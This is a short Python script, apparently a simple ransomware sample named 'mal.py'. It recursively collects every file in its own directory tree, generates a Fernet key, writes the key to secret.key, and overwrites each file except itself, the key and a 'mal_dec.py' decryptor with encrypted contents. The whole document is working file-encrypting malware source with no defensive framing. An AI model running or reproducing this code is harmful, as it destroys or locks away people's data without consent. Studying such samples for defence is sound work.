#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

path = os.path.dirname(os.path.realpath(__file__))
files = []
directorie = []
last_dir = []

# r=root, d=directories, f = files
for r, d, f in os.walk(path):
    for file in f:
        directorie.append(os.path.join(r, file))

key = Fernet.generate_key()

with open("secret.key","wb") as thekey:
    thekey.write(key)

with open("secret.key","rb") as key:
            secretkey=key.read()

for f in directorie:
    #f = f.split('/')[-1]
    if f.split('/')[-1] == "mal.py" or f.split('/')[-1] == "secret.key" or f.split('/')[-1] == "mal_dec.py":
        continue
    else:
        last_dir.append(f)

for file in last_dir:
    with open(file,"rb") as thefile:
        contents=thefile.read()
    contents_encrypted = Fernet(secretkey).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)        

